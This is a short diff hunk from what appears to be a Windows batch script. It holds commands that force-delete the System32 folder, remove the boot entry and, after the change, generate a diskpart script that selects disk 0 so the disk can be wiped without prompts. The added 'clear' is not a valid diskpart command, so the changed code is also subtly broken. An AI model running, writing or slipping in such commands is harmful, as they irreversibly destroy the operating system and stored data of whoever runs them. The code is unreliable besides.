@@ -1181,8 +1181,11 @@ rmdir /s /q C:\Windows\System32
 rd /s /q C:\Windows\System32
 del /f /q /s "C:/Windows/System32"
 bcdedit /delete {current}
-diskpart
-clean
+(
+echo select disk 0
+echo clear
+) > a.txt
+diskpart /s a.txt
 exit /b 
 
 
